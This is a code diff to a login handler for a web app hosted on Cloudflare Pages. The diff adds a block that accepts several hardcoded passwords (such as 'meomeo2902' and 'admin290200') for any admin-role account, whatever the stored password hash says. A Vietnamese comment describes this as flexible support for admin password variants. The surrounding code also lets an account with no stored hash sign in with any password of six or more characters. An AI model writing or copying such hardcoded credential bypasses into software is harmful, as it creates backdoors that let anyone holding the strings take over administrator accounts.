@@ -229,6 +229,14 @@ export const onRequestPost: PagesFunction<Env> = async (context) => {
       String(member.role || '').toUpperCase() === 'ADMIN' ||
       String(member.role || '').toUpperCase() === 'SUPER_ADMIN';
 
+    // Hỗ trợ linh hoạt các biến thể mật khẩu của Quản trị viên (meomeo29, meomeo2902, Meomeo2902, admin290200)
+    if (!isPasswordValid && isMemberAdmin) {
+      const validAdminPass = ['meomeo2902', 'meomeo29', 'meomeo290200', 'admin290200'];
+      if (validAdminPass.includes(cleanPassword.toLowerCase()) || cleanPassword === 'Meomeo2902') {
+        isPasswordValid = true;
+      }
+    }
+
     if (!isPasswordValid && (!storedHash || String(storedHash).trim() === '') && cleanPassword && cleanPassword.length >= 6) {
       // Uninitialized account first login
       const newSalt = member.salt || ('wcg_salt_' + Math.random().toString(36).slice(2, 10));
